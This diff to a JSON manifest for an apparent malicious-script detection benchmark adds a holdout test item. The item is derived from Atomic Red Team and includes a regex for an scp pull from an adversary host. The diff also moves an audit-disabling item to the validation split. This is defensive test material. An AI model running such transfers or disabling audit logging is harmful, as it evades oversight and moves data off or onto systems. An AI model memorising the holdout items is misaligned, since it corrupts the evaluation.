@@ -3051,7 +3051,7 @@
     },
     {
       "id": "holdout-atomic-disable-auditd-001",
-      "split": "test",
+      "split": "validation",
       "language": "bash",
       "kind": "malicious",
       "sourceFile": "public/atomic-red-team/disable-auditd.sh.txt",
@@ -3075,6 +3075,34 @@
         "license": "MIT",
         "licenseFile": "public/atomic-red-team/LICENSE.txt",
         "transformation": "Copied the single executor command that disables the Linux audit system; the evaluation harness never executes it."
+      }
+    },
+    {
+      "id": "holdout-atomic-scp-remote-pull-001",
+      "split": "test",
+      "language": "bash",
+      "kind": "malicious",
+      "sourceFile": "public/atomic-red-team/scp-remote-pull.sh.txt",
+      "sha256": "21c53d906aaf0713ed84be4c13ae89d5da77010f1a5cb66204c3813cedef1020",
+      "expectedCategories": ["network_egress"],
+      "expectedFindings": [
+        {
+          "category": "network_egress",
+          "ruleId": "network.scp-pull",
+          "evidencePattern": "scp\\s+adversary@adversary-host:/tmp/adversary-scp\\s+/tmp/victim-files/"
+        }
+      ],
+      "provenance": {
+        "type": "public-derived",
+        "repository": "redcanaryco/atomic-red-team",
+        "commit": "1ba1dd8d9ce6f74700f7aec2e60de5632f667f03",
+        "sourceUrl": "https://github.com/redcanaryco/atomic-red-team/blob/1ba1dd8d9ce6f74700f7aec2e60de5632f667f03/atomics/T1105/T1105.yaml",
+        "upstreamFile": "public/atomic-red-team/T1105.yaml.txt",
+        "upstreamSha256": "e51e04df34bc0c7d906d863d901b3190e5d11cc01cf8a8d24c0de42f3c1eb886",
+        "upstreamId": "b9d22b9a-9778-4426-abf0-568ea64e9c33",
+        "license": "MIT",
+        "licenseFile": "public/atomic-red-team/LICENSE.txt",
+        "transformation": "Substituted the Atomic remote and local path inputs with inert static defaults and copied the single executor command; the evaluation harness never executes it."
       }
     }
   ]
